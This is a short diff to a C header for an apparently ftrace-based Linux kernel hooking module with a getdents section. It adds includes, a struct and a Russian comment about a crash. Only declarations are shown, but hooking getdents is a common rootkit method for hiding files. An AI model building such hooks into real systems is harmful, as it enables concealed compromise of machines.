@@ -1,11 +1,15 @@
 #ifndef HOOKS_H
 #define HOOKS_H
 
+// падает если жать tab
+
 #include <linux/dirent.h>       // struct linux_dirent64
 #include <linux/sched.h>        // struct task_struct
 #include <linux/fdtable.h>      // struct files_struct, struct fdtable
 #include <linux/fs.h>           // struct file, struct inode, struct super_block, struct file_system_type
 #include <linux/dcache.h>       // struct dentry
+#include <linux/limits.h>       // PATH_MAX
+
 
 #include <linux/delay.h>		// msleep
 
@@ -26,6 +30,11 @@ struct ftrace_hook {
 
 	unsigned long address;
 	struct ftrace_ops ops;
+};
+
+struct Extended_array {
+    void* array_addr;
+    int array_size;
 };
 
 // ------------------------------- getdents ----------------------------------------
